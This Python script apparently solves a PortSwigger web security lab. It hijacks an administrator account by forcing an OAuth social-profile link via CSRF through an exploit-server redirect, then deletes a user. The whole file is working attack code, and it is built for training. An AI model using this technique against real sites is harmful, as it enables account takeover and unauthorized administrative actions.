from bs4 import BeautifulSoup
import requests
import sys
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1].strip().rstrip('/')
login_url = burp_url + '/login'
account_url = burp_url + '/my-account'
logout_url = burp_url + '/logout'
delete_user_url = burp_url + '/admin/delete?username=carlos'

session = requests.Session()
session.verify = False

r = session.get(login_url)
csrf_token = BeautifulSoup(r.text, 'html.parser').find('input', attrs={'name': 'csrf'})['value']
data = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
session.post(login_url, data=data)

r = session.get(account_url)
oauth_link = BeautifulSoup(r.text, 'html.parser').findAll('a', text='Attach a social profile')[0]['href']

oauth_url_details = urllib3.util.parse_url(oauth_link)
oauth_host = f'{oauth_url_details.scheme}://{oauth_url_details.host}'
r = session.get(oauth_link)
login_target = BeautifulSoup(r.text, 'html.parser').find('form', attrs={'class': 'login-form'})['action']
url = f'{oauth_host}{login_target}'
data = {'username': 'peter.wiener', 'password': 'hotdog'}
r = session.post(url, data=data)
confirm_target = BeautifulSoup(r.text, 'html.parser').find('form', attrs={'method': 'post'})['action']
url = f'{oauth_host}{confirm_target}'
r = session.post(url, allow_redirects=False)
r = session.get(r.headers['Location'], allow_redirects=False)
redirect_url = r.headers['Location']

r = session.get(burp_url)
exploit_server = BeautifulSoup(r.text, 'html.parser').find('a', attrs={'id': 'exploit-link'})['href']
data = {'urlIsHttps': 'on',
        'responseFile': '/exploit',
        'responseHead': f'HTTP/1.1 302 Found\nContent-Type: text/html; charset=utf-8\nLocation:{redirect_url}',
        'responseBody': 'Nothing here...',
        'formAction': 'STORE'}
session.post(exploit_server, data=data)

session.get(f'{exploit_server}/deliver-to-victim', allow_redirects=False)

session.get(logout_url, allow_redirects=False)

r = session.get(login_url)
oauth_login_link = BeautifulSoup(r.text, 'html.parser').findAll('a', text='Login with social media')[0]['href']
session.get(oauth_login_link)

session.get(delete_user_url, allow_redirects=False)

time.sleep(2)
r = session.get(burp_url)
if 'Congratulations, you solved the lab!' not in r.text:
    sys.exit(-99)
